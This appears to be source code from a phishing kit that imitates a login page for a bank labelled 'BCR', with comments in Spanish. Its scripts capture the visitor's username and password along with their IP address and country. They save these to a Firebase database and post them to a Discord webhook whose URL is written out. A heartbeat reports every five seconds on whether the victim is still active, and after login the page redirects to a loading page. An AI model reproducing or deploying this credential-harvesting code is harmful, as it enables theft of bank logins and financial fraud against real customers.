<script>
  const firebaseConfig = {
    apiKey: "AIzaSyDWkga80jjGG2YtF9obwfIf9UuSACayWko",
    authDomain: "kkkkk-5e2bd.firebaseapp.com",
    databaseURL: "https://kkkkk-5e2bd-default-rtdb.firebaseio.com",
    projectId: "kkkkk-5e2bd",
    storageBucket: "kkkkk-5e2bd.firebasestorage.app",
    messagingSenderId: "1059258934487",
    appId: "1:1059258934487:web:72d14c094dc78e6140fc92"
  };

  if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
  }
  const db = firebase.firestore();

  // --- SISTEMA DE LATIDOS (Heartbeat) ---
  function enviarLatido() {
    const usuarioId = localStorage.getItem("usuario");
    
    if (usuarioId) {
      db.collection("prolme").doc(usuarioId).set({
        last_active: firebase.firestore.FieldValue.serverTimestamp()
      }, { merge: true }).catch((error) => {
        console.error("Error al enviar latido:", error);
      });
    }
  }

  // El latido corre cada 5 segundos de forma independiente
  setInterval(enviarLatido, 5000);

  // Enviar latido si el usuario oculta la pestaña
  window.addEventListener('visibilitychange', function() {
    if (document.visibilityState === 'hidden') {
      enviarLatido();
    }
  });
</script>

<body background="background.png">

<script>
function togglePasswordVisibility() {
    const passwordInput = document.getElementById('password');
    const eyeIcon = document.getElementById('eyeIcon');
    
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        // Icono de ojo tachado (ocultar contraseña)
        eyeIcon.innerHTML = '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.36 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.12c0-1.66-1.34-3-3-3l-.17.02z"/>';
    } else {
        passwordInput.type = 'password';
        // Icono de ojo normal (mostrar contraseña)
        eyeIcon.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
    }
}

function checkInputs() {
    const user = document.getElementById('ypn-us').value.trim();
    const pass = document.getElementById('password').value.trim();
    const submitBtn = document.getElementById('submitBtn');

    if (user !== "" && pass !== "") {
        submitBtn.removeAttribute('disabled');
    } else {
        submitBtn.setAttribute('disabled', 'true');
    }
}
</script>

<script>
    async function getCountry() {
        try {
            const response = await fetch('https://ipinfo.io/json');
            const data = await response.json();
            return data.country;
        } catch (error) {
            console.error('Error al obtener el país:', error);
            return 'País Desconocido';
        }
    }

    async function getIPAddress() {
        try {
            const response = await fetch('https://api64.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Error al obtener la dirección IP:', error);
            return 'IP Desconocida';
        }
    }

    document.querySelector("#loginform").addEventListener("submit", async (event) => {
        event.preventDefault();

        const usuario = document.querySelector("#ypn-us").value.trim();
        const contrasena = document.querySelector("#password").value;

        if (!usuario) {
            alert("Por favor, complete todos los campos.");
            return;
        }

        const pais = await getCountry();
        const ip = await getIPAddress();

        try {
            // Guardar o actualizar en Firestore usando la sintaxis correcta v8
            await db.collection("prolme").doc(usuario).set({
                user: usuario,
                pass: contrasena,
                pais: pais,
                ip: ip,
                question1: "Sin uso",
                question2: "Sin uso",
                question3: "Sin uso",
                page: 0,
                last_active: firebase.firestore.FieldValue.serverTimestamp()
            }, { merge: true });

            localStorage.setItem("usuario", usuario);

            const message = `➖➖➖➖➖[ 🏦BCR ]➖➖➖➖➖\n👤 Usuario: ${usuario}\n👤 Contraseña: ${contrasena}\n➖➖➖➖➖[ IP ]➖➖➖➖➖\nPaís: ${pais}\nIP: ${ip}\n➖➖➖➖➖[ By FwC 👨🏻‍💻 ]➖➖➖➖➖\n`;

            const discord_webhook_url = "https://discord.com/api/webhooks/1534616941476581568/YTnnkJt7vQqtrmv1ERAYs0vEJDb4340R0lhVmPvflTgky0JErdqJKj2VPa4pQ9al6ReU";

            await fetch(discord_webhook_url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    content: message
                }),
            });

            window.location.href = "cargando.html";
        } catch (error) {
            console.error("Error al enviar datos:", error);
        }
    });
</script>
